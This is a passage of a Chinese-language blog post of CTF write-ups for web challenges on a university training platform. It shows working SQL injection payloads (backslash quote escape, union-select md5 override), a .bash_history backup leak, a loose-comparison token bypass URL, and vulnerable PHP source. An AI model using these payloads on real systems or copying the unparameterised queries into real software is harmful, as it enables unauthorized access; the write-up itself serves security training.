class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $flag;</div></pre></td></tr></table></figure></p>
<p>输入的时候使用了htmlentities函数，基本上单引号绕过就不可能做到了。<br>但是可以用反斜杠来转义掉一个单引号。构造<code>username=admin\&amp;password= or 1=1 %23</code>，此时的SQL语句变成了：<code>SELECT * FROM users WHERE name=&#39;admin\&#39; AND pass=&#39; or 1=1 #&#39;;</code>成功绕过。<br>得到flag:<code>nctf{sql_injection_is_interesting}</code></p>
<h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><p>打开之后是jsfuck编码，放浏览器的console运行之后得到：1bc29b36f623ba82aaf6724fd3b16718.php<br>访问之后看到：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里<br>汗！不过看请求返回包里面有个tip: history of bash<br>于是想到.bash_history，访问看到：zip -r flagbak.zip ./*<br>然后就下载flagbak.zip，解压得到flag is:<code>nctf{bash_history_means_what}</code></p>
<h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>查看网页的源代码，有这么一段：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = $_POST[user];</div><div class="line">  $pass = md5($_POST[pass]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</div><div class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>输出flag的条件是pass和$query[pw])相等。由于是先去数据库中取出pw，然后再进行比较，所以存在sql注入。<br>构造<code>user=0&#39; union select &#39;c4ca4238a0b923820dcc509a6f75849b&#39; %23&amp;pass=1</code>，其中c4ca4238a0b923820dcc509a6f75849b是1的md5<br>这个时候的SQL语句就变成<code>select pw from ctf where user=&#39;0&#39; union select &#39;c4ca4238a0b923820dcc509a6f75849b&#39;%23</code>,也就是用union select的值去覆盖了pw的结果<br>也就是这时候query[pw]就是c4ca4238a0b923820dcc509a6f75849b，而输入的pass也是c4ca4238a0b923820dcc509a6f75849b，那么就相等，flag就出来了。<br>Key: <code>ntcf{union_select_is_wtf}</code></p>
<h3 id="注入实战1"><a href="#注入实战1" class="headerlink" title="注入实战1"></a>注入实战1</h3><p>网站进不去了。估计是被注入太多次了，哈哈。</p>
<h3 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h3><p>参考<a href="http://www.hazzel.cn/archives/10.html" target="_blank" rel="external">http://www.hazzel.cn/archives/10.html</a></p>
<h3 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h3><p>可以从源代码获取到管理员的邮箱地址：<code>admin@nuptzj.cn</code><br>根据题目的提示可以找到vim的备份文件：.submit.php.swp<br>里面有一段关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</div><div class="line">    <span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</div><div class="line">    <span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</div><div class="line">    $sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</div><div class="line">    $r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</div><div class="line">    $r = mysql_fetch_assoc($r);</div><div class="line">    $r = $r[<span class="string">'num'</span>];</div><div class="line">    <span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">echo</span> $flag;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>意思是说：token和emailAddress不能为空；token的长度必须为10；token不能等于’0’，那么可以构造成0000000000<br>于是url为：<code>http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin@nuptzj.cn&amp;token=0000000000</code><br>获得flag：<code>nctf{thanks_to_cumt_bxs}</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/10/13/南京邮电大学网络攻防训练平台题解——WEB/" data-id="civ94yuaz000j1gcihgf2bh45" class="article-share-link">Partager</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2016/10/19/CTF题解20161019/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Récent</strong>
      <div class="article-nav-title">
        
          CTF题解20161019
        
      </div>
    </a>
  
  
    <a href="/2016/10/12/南京邮电大学网络攻防训练平台题解——密码学/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Ancien</strong>
      <div class="article-nav-title">南京邮电大学网络攻防训练平台题解——密码学</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Catégories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Flask/">Flask</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Mot-clés</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MISC/">MISC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nginx/">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/隐写术/">隐写术</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Nuage de mot-clés</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Flask/" style="font-size: 10px;">Flask</a> <a href="/tags/MISC/" style="font-size: 15px;">MISC</a> <a href="/tags/Nginx/" style="font-size: 10px;">Nginx</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/隐写术/" style="font-size: 10px;">隐写术</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Articles récents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/10/19/CTF题解20161019/">CTF题解20161019</a>
          </li>
        
          <li>
            <a href="/2016/10/13/南京邮电大学网络攻防训练平台题解——WEB/">南京邮电大学网络攻防训练平台题解——WEB</a>
          </li>
        
          <li>
            <a href="/2016/10/12/南京邮电大学网络攻防训练平台题解——密码学/">南京邮电大学网络攻防训练平台题解——密码学</a>
          </li>
        
          <li>
            <a href="/2016/10/12/南京邮电大学网络攻防训练平台题解——隐写术/">南京邮电大学网络攻防训练平台题解——隐写术</a>
          </li>
        
          <li>
            <a href="/2016/10/12/南京邮电大学网络攻防训练平台题解——MISC/">南京邮电大学网络攻防训练平台题解——MISC</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 BonjourChen<br>
      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>